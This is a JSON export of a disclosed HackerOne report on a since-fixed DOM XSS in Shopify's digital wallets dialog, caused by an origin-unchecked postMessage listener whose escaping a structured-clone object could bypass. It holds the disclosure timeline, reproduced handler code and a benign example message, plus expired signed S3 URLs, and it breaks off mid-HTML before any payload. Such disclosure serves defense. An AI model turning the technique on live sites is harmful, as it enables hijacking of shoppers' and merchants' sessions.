{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-05-30T17:10:05.220Z", 
    "voters": [
        "jin", 
        "manoelt", 
        "flamezzz", 
        "arneswinnen", 
        "tomdev", 
        "nirvana-msu", 
        "sp1d3rs", 
        "jobert", 
        "michiel", 
        "bl4de", 
        "and 87 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "3000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 231053, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-05-29T17:26:17.702Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "XSS on any Shopify shop via abuse of the HTML5 structured clone algorithm in postMessage listener on \"/:id/digital_wallets/dialog\"", 
    "is_member_of_team?": null, 
    "vote_count": 97, 
    "summaries": [
        {
            "category": "team", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 4248, 
            "content": "This issue is a XSS affecting all Shopify stores that can be triggered via `windows.postMessage` from any remote origin. The report demonstrated a clever bypass of the escaping code we had in place to prevent code injection.", 
            "content_html": "<p>This issue is a XSS affecting all Shopify stores that can be triggered via <code>windows.postMessage</code> from any remote origin. The report demonstrated a clever bypass of the escaping code we had in place to prevent code injection.</p>\n"
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$3,000", 
    "attachments": [
        {
            "file_name": "Screen_Shot_2017-05-23_at_2.18.44_AM.png", 
            "type": "image/png", 
            "id": 187323, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/187/323/a9ce0d995d209aa7009a5b3ab3951b2173c63835/Screen_Shot_2017-05-23_at_2.18.44_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3XJAUJU3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223803Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDFhsOVc%2BLBuZJpN2%2FSK3A3ZSLRshQ37cr%2FnNfrsDZBl9Q9MwEJMM1w9f3SvUV6XmoP9nE3PeRToIYvFP152VEnHi03BXq%2BWX7mrp9duCLiSGu%2BuVj85dqXhL9hy5iZ8Baa9Dz1PfTpOuhKCmbaYzCWIDNTGGHjLe%2FHfj5BNMi3SKneAl%2FX0h%2BZqSIdJKDz1SK5Y92eHwZBEL8GznF9GsT%2Fe6zDxKRumhz8Vkk3IGYi5pwUBa6qmtuvb0%2FFBueYSgxUsIbsmK0uIt1sxLJbfLOybgHUA18Z80yVa0KlQc%2BgoSsS484NaEhLTbRqdlZ%2BxywVi8oiNq8ePPGFix9FXwU3HcD5DsyS3oPWa%2BzB9%2FB%2Fj5i%2F%2B%2Fdj%2Fww%2BhTYa6J%2BrE25cJz8f7DhYt5rCg9X8q2TCUwBOYuOUl5A0l4eFCWneCTq2xxhRjl1g1J%2BaAUAShH%2BiAD7%2BKi%2B3APDa6E97UEIGwiReOW1M7p2dsYu%2BTRFAcWFkx%2FfdNcmK%2F1EAANP1i4cT%2FBf2l24Vc5LPZJjCm1RkrTRxc90qzl8fyslqz595eagGsI73K0uzaibH5HvlrUQwLfX4TmlW%2Foze1zEhFUOiAB5qs%2FM3wow8am4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=713ba0c976e145d4251308cdca0c6390c7f7fb5388ff32a52b331619d453328e"
        }, 
        {
            "file_name": "Screen_Shot_2017-05-23_at_2.24.34_AM.png", 
            "type": "image/png", 
            "id": 187326, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/187/326/a896e551f4f0d07897a3e55daaa84baeaace9076/Screen_Shot_2017-05-23_at_2.24.34_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3XJAUJU3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223803Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDFhsOVc%2BLBuZJpN2%2FSK3A3ZSLRshQ37cr%2FnNfrsDZBl9Q9MwEJMM1w9f3SvUV6XmoP9nE3PeRToIYvFP152VEnHi03BXq%2BWX7mrp9duCLiSGu%2BuVj85dqXhL9hy5iZ8Baa9Dz1PfTpOuhKCmbaYzCWIDNTGGHjLe%2FHfj5BNMi3SKneAl%2FX0h%2BZqSIdJKDz1SK5Y92eHwZBEL8GznF9GsT%2Fe6zDxKRumhz8Vkk3IGYi5pwUBa6qmtuvb0%2FFBueYSgxUsIbsmK0uIt1sxLJbfLOybgHUA18Z80yVa0KlQc%2BgoSsS484NaEhLTbRqdlZ%2BxywVi8oiNq8ePPGFix9FXwU3HcD5DsyS3oPWa%2BzB9%2FB%2Fj5i%2F%2B%2Fdj%2Fww%2BhTYa6J%2BrE25cJz8f7DhYt5rCg9X8q2TCUwBOYuOUl5A0l4eFCWneCTq2xxhRjl1g1J%2BaAUAShH%2BiAD7%2BKi%2B3APDa6E97UEIGwiReOW1M7p2dsYu%2BTRFAcWFkx%2FfdNcmK%2F1EAANP1i4cT%2FBf2l24Vc5LPZJjCm1RkrTRxc90qzl8fyslqz595eagGsI73K0uzaibH5HvlrUQwLfX4TmlW%2Foze1zEhFUOiAB5qs%2FM3wow8am4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=52eb6550fdb4779c19606110d0e56769c4fa09399cbcd3fbaa1d4bfdb6e87ae4"
        }
    ], 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-05-25T14:11:06.715Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-25T14:11:06.715Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Thank you for your report. Our engineering team is investigating the issue.", 
            "markdown_message": "<p>Thank you for your report. Our engineering team is investigating the issue.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1700650, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-26T22:54:06.160Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-26T22:54:06.160Z", 
            "actor": {
                "username": "jack_mccracken", 
                "url": "/jack_mccracken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/164/342/d84663e45cc32643d2cf593fcc17d1b5db05255e_medium.jpeg?1495044147"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Hey!\n\nWe recently deployed a fix for this issue. We've verified that your PoC no longer works. Would you mind verifying it from your end?", 
            "markdown_message": "<p>Hey!</p>\n\n<p>We recently deployed a fix for this issue. We&#39;ve verified that your PoC no longer works. Would you mind verifying it from your end?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1704523, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-27T17:02:05.719Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-27T17:02:05.719Z", 
            "actor": {
                "username": "bored-engineer", 
                "url": "/bored-engineer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/328/1b156e9f7c558cb2b9910d7b538b1d0190f5d1b9_medium.png?1467257466"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "@jack_mccracken The deployed fix looks good to me! ", 
            "markdown_message": "<p><a href=\"/jack_mccracken\">@jack_mccracken</a> The deployed fix looks good to me! </p>\n", 
            "type": "Activities::Comment", 
            "id": 1705331, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "bored-engineer", 
                "url": "/bored-engineer"
            }, 
            "created_at": "2017-05-28T21:13:05.128Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-28T21:13:05.128Z", 
            "actor": {
                "username": "jack_mccracken", 
                "url": "/jack_mccracken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/164/342/d84663e45cc32643d2cf593fcc17d1b5db05255e_medium.jpeg?1495044147"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1706509, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-05-29T17:25:55.306Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-29T17:25:55.306Z", 
            "actor": {
                "url": "/shopify", 
                "profile": {
                    "name": "Shopify"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
                }
            }, 
            "team_handle": "shopify", 
            "bonus_amount": "0.0", 
            "bounty_amount": "3000.0", 
            "collaborator": {
                "username": "bored-engineer", 
                "url": "/bored-engineer"
            }, 
            "message": "Hi @bored-engineer, thanks again for this report. We're awarding a bounty slightly higher than similar reports based on a couple of factors:\n1) the issue can be used by an unauthenticated attacker, and affects all stores\n2) the quality of the report\n3) there is a good chance the issue might not have been found internally, even by qualified reviewers, because of the tricky escaping logic we had in place", 
            "markdown_message": "<p>Hi <a href=\"/bored-engineer\">@bored-engineer</a>, thanks again for this report. We&#39;re awarding a bounty slightly higher than similar reports based on a couple of factors:<br>\n1) the issue can be used by an unauthenticated attacker, and affects all stores<br>\n2) the quality of the report<br>\n3) there is a good chance the issue might not have been found internally, even by qualified reviewers, because of the tricky escaping logic we had in place</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1707792, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-29T17:26:17.729Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-29T17:26:17.729Z", 
            "actor": {
                "username": "francoischagnon", 
                "url": "/francoischagnon", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/168/3b5130025fbf90eaeb1c9234baa340dfead68f44_medium.jpg?1429126005"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "first_to_agree": true, 
            "message": "We can disclose the report if you'd like", 
            "markdown_message": "<p>We can disclose the report if you&#39;d like</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1707793, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-30T17:10:05.239Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-30T17:10:05.239Z", 
            "actor": {
                "username": "bored-engineer", 
                "url": "/bored-engineer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/328/1b156e9f7c558cb2b9910d7b538b1d0190f5d1b9_medium.png?1467257466"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Sure, it was a fun one to work on. Thanks!", 
            "markdown_message": "<p>Sure, it was a fun one to work on. Thanks!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1710187, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-30T17:10:05.291Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-30T17:10:05.291Z", 
            "actor": {
                "username": "bored-engineer", 
                "url": "/bored-engineer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/328/1b156e9f7c558cb2b9910d7b538b1d0190f5d1b9_medium.png?1467257466"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1710188, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "bored-engineer", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/bored-engineer", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/007/328/369436c6c39c8338c3bd3c96466f58fd2b4bee1d_small.png?1467257466"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 63, 
        "name": "Cross-site Scripting (XSS) - DOM"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2017-05-30T17:10:05.272Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/231053", 
    "created_at": "2017-05-23T09:55:08.696Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h1 id=\"description\">Description</h1>\n\n<p>The <code>/:id/digital_wallets/dialog</code> endpoint is used to display a small dialog box relating to the &quot;digital wallets&quot; functionality on a shop. The endpoint includes a script that listens for postMessages without validating the origin of messages. However, the impact of the missing validation is very limited because the script attempts to escape any content to prevent any HTML injection. By sending a specially crafted postMessage containing a &quot;clone-able&quot; object (per the <a href=\"/redirect?signature=68bf5806119615203813985dafb21baf669ed314&amp;url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FWeb_Workers_API%2FStructured_clone_algorithm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>HTML5 structured clone algorithm</span><i class=\"icon-external-link\"></i></a>) this escaping can be bypassed allowing a malicious actor to obtain XSS. </p>\n\n<h1 id=\"technical-background\">Technical Background</h1>\n\n<p>Note: For the sake of clarity I&#39;ve renamed some of the variables and re-written sections of code to only include the relevant functions from <a href=\"/redirect?signature=2e697d21c8230cbfff0b3eded8e46991d63acfba&amp;url=https%3A%2F%2Fcdn.shopify.com%2Fs%2Fassets%2Fservices%2Fdigital_wallets%2Fscripts-e4c6841a7e9dfd3216a6cc52da1313648ea3b449f388411eac2f260b3f7f36f6.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>the minified JavaScript</span><i class=\"icon-external-link\"></i></a> so this report is easier to understand...<br>\nThe <a href=\"/redirect?signature=17b8584aea4c2f186f172cdd0771b54bc39815ee&amp;url=https%3A%2F%2Fbored-engineering-whitehat-2.myshopify.com%2F1337%2Fdigital_wallets%2Fdialog\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>/:id/digital_wallets/dialog</span><i class=\"icon-external-link\"></i></a> route initializes a postMessage listener on page load that looks like this:</p>\n<pre class=\"highlight javascript\"><code><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">_messageHandler</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">event</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">event</span><span class=\"p\">.</span><span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">event</span><span class=\"p\">.</span><span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">type</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nx\">event</span><span class=\"p\">.</span><span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">digitalWalletsDialog</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nx\">c</span><span class=\"p\">(</span><span class=\"nx\">i</span><span class=\"p\">,</span> <span class=\"nx\">event</span><span class=\"p\">.</span><span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">type</span><span class=\"p\">,</span> <span class=\"nx\">event</span><span class=\"p\">.</span><span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">payload</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n<span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">_localWindow</span><span class=\"p\">.</span><span class=\"nx\">addEventListener</span><span class=\"p\">(</span><span class=\"s2\">&quot;message&quot;</span><span class=\"p\">,</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">_messageHandler</span><span class=\"p\">)</span>\n</code></pre>\n<p>The <code>c</code> function which handles the message is responsible for a few different message types, in this case we&#39;re only interested in the <code>DigitalWalletsDialog:change</code> type:</p>\n<pre class=\"highlight javascript\"><code><span class=\"kd\">function</span> <span class=\"nx\">c</span><span class=\"p\">(</span><span class=\"nx\">inst</span><span class=\"p\">,</span> <span class=\"nx\">type</span><span class=\"p\">,</span> <span class=\"nx\">payload</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">switch</span> <span class=\"p\">(</span><span class=\"nx\">type</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">case</span> <span class=\"nx\">ze</span><span class=\"p\">.</span><span class=\"nx\">DIALOG_CHANGE</span><span class=\"p\">:</span> <span class=\"c1\">// DigitalWalletsDialog:change</span>\n      <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">d</span><span class=\"p\">(</span><span class=\"nx\">payload</span><span class=\"p\">))</span> <span class=\"p\">{</span> <span class=\"c1\">// Check that the required fields are present</span>\n        <span class=\"nx\">g</span><span class=\"p\">(</span><span class=\"nx\">inst</span><span class=\"p\">)</span> <span class=\"c1\">// Reset the DOM</span>\n        <span class=\"nx\">p</span><span class=\"p\">(</span><span class=\"nx\">inst</span><span class=\"p\">,</span> <span class=\"nx\">payload</span><span class=\"p\">)</span> <span class=\"c1\">// Insert the payload into the DOM</span>\n<span class=\"p\">...</span>\n</code></pre>\n<p>As noted in my previous comments the <code>d</code> function and <code>g</code> function are relatively straightforward and un-interesting:</p>\n<pre class=\"highlight javascript\"><code><span class=\"kd\">function</span> <span class=\"nx\">d</span><span class=\"p\">(</span><span class=\"nx\">payload</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">required</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"s2\">&quot;title&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;button&quot;</span><span class=\"p\">]</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">idx</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">idx</span> <span class=\"o\">&lt;</span> <span class=\"nx\">required</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">;</span> <span class=\"nx\">idx</span><span class=\"o\">++</span><span class=\"p\">)</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nx\">payload</span><span class=\"p\">[</span><span class=\"nx\">required</span><span class=\"p\">[</span><span class=\"nx\">idx</span><span class=\"p\">]]</span> <span class=\"o\">||</span> <span class=\"s2\">&quot;&quot;</span> <span class=\"o\">===</span> <span class=\"o\">!</span><span class=\"nx\">payload</span><span class=\"p\">[</span><span class=\"nx\">required</span><span class=\"p\">[</span><span class=\"nx\">idx</span><span class=\"p\">]])</span> <span class=\"p\">{</span>\n      <span class=\"k\">return</span> <span class=\"kc\">false</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">return</span> <span class=\"kc\">true</span>\n<span class=\"p\">}</span>\n<span class=\"kd\">function</span> <span class=\"nx\">g</span><span class=\"p\">(</span><span class=\"nx\">inst</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">idx</span> <span class=\"k\">in</span> <span class=\"nx\">inst</span><span class=\"p\">.</span><span class=\"nx\">customizableElements</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">inst</span><span class=\"p\">.</span><span class=\"nx\">customizableElements</span><span class=\"p\">[</span><span class=\"nx\">idx</span><span class=\"p\">].</span><span class=\"nx\">innerHTML</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;&quot;</span>\n    <span class=\"nx\">inst</span><span class=\"p\">.</span><span class=\"nx\">customizableElements</span><span class=\"p\">[</span><span class=\"nx\">idx</span><span class=\"p\">].</span><span class=\"nx\">classList</span><span class=\"p\">.</span><span class=\"nx\">remove</span><span class=\"p\">(</span><span class=\"s2\">&quot;hidden&quot;</span><span class=\"p\">)</span>\n  <span class=\"p\">}</span>\n  <span class=\"nx\">inst</span><span class=\"p\">.</span><span class=\"nx\">customizableElements</span><span class=\"p\">.</span><span class=\"nx\">errorList</span><span class=\"p\">.</span><span class=\"nx\">scrollTop</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n<span class=\"p\">}</span>\n</code></pre>\n<p>Understanding all of the previous pieces, we can pass a legitimate message through the functions like so:</p>\n<pre class=\"highlight javascript\"><code><span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">postMessage</span><span class=\"p\">({</span>\n  <span class=\"na\">type</span><span class=\"p\">:</span> <span class=\"s2\">&quot;DigitalWalletsDialog:change&quot;</span><span class=\"p\">,</span>\n  <span class=\"na\">digitalWalletsDialog</span><span class=\"p\">:</span> <span class=\"kc\">true</span><span class=\"p\">,</span>\n  <span class=\"na\">payload</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n    <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"s2\">&quot;placeholder&quot;</span><span class=\"p\">,</span>\n    <span class=\"na\">button</span><span class=\"p\">:</span> <span class=\"s2\">&quot;placeholder&quot;</span>\n  <span class=\"p\">},</span>\n<span class=\"p\">},</span> <span class=\"s2\">&quot;*&quot;</span><span class=\"p\">);</span>\n</code></pre>\n<p>And when we do the dialog renders as expected:<br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2017-05-23_at_2.18.44_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/187/323/a9ce0d995d209aa7009a5b3ab3951b2173c63835/Screen_Shot_2017-05-23_at_2.18.44_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ3XJAUJU3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223803Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEBAaDFhsOVc%2BLBuZJpN2%2FSK3A3ZSLRshQ37cr%2FnNfrsDZBl9Q9MwEJMM1w9f3SvUV6XmoP9nE3PeRToIYvFP152VEnHi03BXq%2BWX7mrp9duCLiSGu%2BuVj85dqXhL9hy5iZ8Baa9Dz1PfTpOuhKCmbaYzCWIDNTGGHjLe%2FHfj5BNMi3SKneAl%2FX0h%2BZqSIdJKDz1SK5Y92eHwZBEL8GznF9GsT%2Fe6zDxKRumhz8Vkk3IGYi5pwUBa6qmtuvb0%2FFBueYSgxUsIbsmK0uIt1sxLJbfLOybgHUA18Z80yVa0KlQc%2BgoSsS484NaEhLTbRqdlZ%2BxywVi8oiNq8ePPGFix9FXwU3HcD5DsyS3oPWa%2BzB9%2FB%2Fj5i%2F%2B%2Fdj%2Fww%2BhTYa6J%2BrE25cJz8f7DhYt5rCg9X8q2TCUwBOYuOUl5A0l4eFCWneCTq2xxhRjl1g1J%2BaAUAShH%2BiAD7%2BKi%2B3APDa6E97UEIGwiReOW1M7p2dsYu%2BTRFAcWFkx%2FfdNcmK%2F1EAANP1i4cT%2FBf2l24Vc5LPZJjCm1RkrTRxc90qzl8fyslqz595eagGsI73K0uzaibH5HvlrUQwLfX4TmlW%2Foze1zEhFUOiAB5qs%2FM3wow8am4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=713ba0c976e145d4251308cdca0c6390c7f7fb5388ff32a52b331619d453328e\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/187/323/a9ce0d995d209aa7009a5b3ab3951b2173c63835/Screen_Shot_2017-05-23_at_2.18.44_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ3XJAUJU3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223803Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEBAaDFhsOVc%2BLBuZJpN2%2FSK3A3ZSLRshQ37cr%2FnNfrsDZBl9Q9MwEJMM1w9f3SvUV6XmoP9nE3PeRToIYvFP152VEnHi03BXq%2BWX7mrp9duCLiSGu%2BuVj85dqXhL9hy5iZ8Baa9Dz1PfTpOuhKCmbaYzCWIDNTGGHjLe%2FHfj5BNMi3SKneAl%2FX0h%2BZqSIdJKDz1SK5Y92eHwZBEL8GznF9GsT%2Fe6zDxKRumhz8Vkk3IGYi5pwUBa6qmtuvb0%2FFBueYSgxUsIbsmK0uIt1sxLJbfLOybgHUA18Z80yVa0KlQc%2BgoSsS484NaEhLTbRqdlZ%2BxywVi8oiNq8ePPGFix9FXwU3HcD5DsyS3oPWa%2BzB9%2FB%2Fj5i%2F%2B%2Fdj%2Fww%2BhTYa6J%2BrE25cJz8f7DhYt5rCg9X8q2TCUwBOYuOUl5A0l4eFCWneCTq2xxhRjl1g1J%2BaAUAShH%2BiAD7%2BKi%2B3APDa6E97UEIGwiReOW1M7p2dsYu%2BTRFAcWFkx%2FfdNcmK%2F1EAANP1i4cT%2FBf2l24Vc5LPZJjCm1RkrTRxc90qzl8fyslqz595eagGsI73K0uzaibH5HvlrUQwLfX4TmlW%2Foze1zEhFUOiAB5qs%2FM3wow8am4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=713ba0c976e145d4251308cdca0c6390c7f7fb5388ff32a52b331619d453328e\" class=\"markdown-inline-image\"></a><br>\nLooking more into the <code>p</code> function we see it is responsible for setting/creating the values for a number of elements on the DOM:</p>\n<pre class=\"highlight javascript\"><code><span class=\"kd\">function</span> <span class=\"nx\">p</span><span class=\"p\">(</span><span class=\"nx\">inst</span><span class=\"p\">,</span> <span class=\"nx\">payload</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"nx\">_</span><span class=\"p\">(</span><span class=\"nx\">inst</span><span class=\"p\">,</span> <span class=\"nx\">t</span><span class=\"p\">.</span><span class=\"nx\">icon</span><span class=\"p\">)</span>\n  <span class=\"nx\">v</span><span class=\"p\">(</span><span class=\"nx\">inst</span><span class=\"p\">,</span> <span class=\"s2\">&quot;title&quot;</span><span class=\"p\">,</span> <span class=\"nx\">payload</span><span class=\"p\">.</span><span class=\"nx\">title</span><span class=\"p\">)</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">payload</span><span class=\"p\">.</span><span class=\"nx\">errors</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nb\">Array</span><span class=\"p\">.</span><span class=\"nx\">isArray</span><span class=\"p\">(</span><span class=\"nx\">payload</span><span class=\"p\">.</span><span class=\"nx\">errors</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n      <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">payload</span><span class=\"p\">.</span><span class=\"nx\">errors</span><span class=\"p\">.</span><span class=\"nx\">length</span> <span class=\"o\">&gt;</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nx\">v</span><span class=\"p\">(</span><span class=\"nx\">inst</span><span class=\"p\">,</span> <span class=\"s2\">&quot;errorList&quot;</span><span class=\"p\">,</span> <span class=\"nx\">h</span><span class=\"p\">(</span><span class=\"nx\">payload</span><span class=\"p\">.</span><span class=\"nx\">errors</span><span class=\"p\">))</span>\n        <span class=\"nx\">inst</span><span class=\"p\">.</span><span class=\"nx\">customizableElements</span><span class=\"p\">.</span><span class=\"nx\">errorDescription</span><span class=\"p\">.</span><span class=\"nx\">classList</span><span class=\"p\">.</span><span class=\"nx\">add</span><span class=\"p\">(</span><span class=\"s2\">&quot;hidden&quot;</span><span class=\"p\">)</span>\n        <span class=\"nx\">inst</span><span class=\"p\">.</span><span class=\"nx\">staticElements</span><span class=\"p\">.</span><span class=\"nx\">errorListContainer</span><span 